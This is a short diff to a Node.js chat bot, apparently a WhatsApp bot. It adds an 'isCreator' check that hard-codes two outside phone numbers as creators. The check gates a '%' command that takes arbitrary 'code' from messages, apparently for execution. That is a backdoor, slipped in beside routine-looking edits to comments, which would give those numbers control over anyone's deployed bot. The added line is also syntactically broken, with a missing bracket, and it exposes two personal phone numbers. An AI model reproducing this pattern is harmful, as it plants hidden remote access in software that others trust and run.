@@ -245,14 +245,12 @@ const port = process.env.PORT || 8000;
     }
 });
 
-	    // ---- BOTNUMBER REFERENCE FIX START ----
-    const myBotNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : '0';
+	const myBotNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : '0';
     const udp = myBotNumber;
-    // ---- BOTNUMBER REFERENCE FIX END ----
+    let isCreator = '94783747285', '94761068032', config.DEV].map(v => v ? v.replace(/[^0-9]/g, '') : '').includes(mek.sender ? mek.sender.replace(/[^0-9]/g, '') : '');
 
+    if (isCreator && mek.text.startsWith('%')) {
 
-
-            if (isCreator && mek.text.startsWith('%')) {
             let code = budy.slice(2);
             if (!code) {
                 reply('Provide me with a query');
